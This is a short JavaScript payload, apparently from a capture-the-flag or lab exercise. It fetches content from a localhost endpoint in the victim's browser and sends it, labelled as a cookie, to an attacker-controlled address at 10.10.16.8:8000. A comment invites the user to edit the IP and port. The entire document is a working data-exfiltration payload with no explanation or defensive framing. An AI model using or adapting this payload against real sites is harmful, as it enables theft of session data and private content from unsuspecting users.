var req1 = new XMLHttpRequest();
req1.open('GET', 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65', false);
req1.send();
var response = req1.responseText;

var exfilUrl = 'http://10.10.16.8:8000/?cookie=' + encodeURIComponent(response); // Edit the IP and Port
var req2 = new XMLHttpRequest();
req2.open('GET', exfilUrl, true);
req2.send();
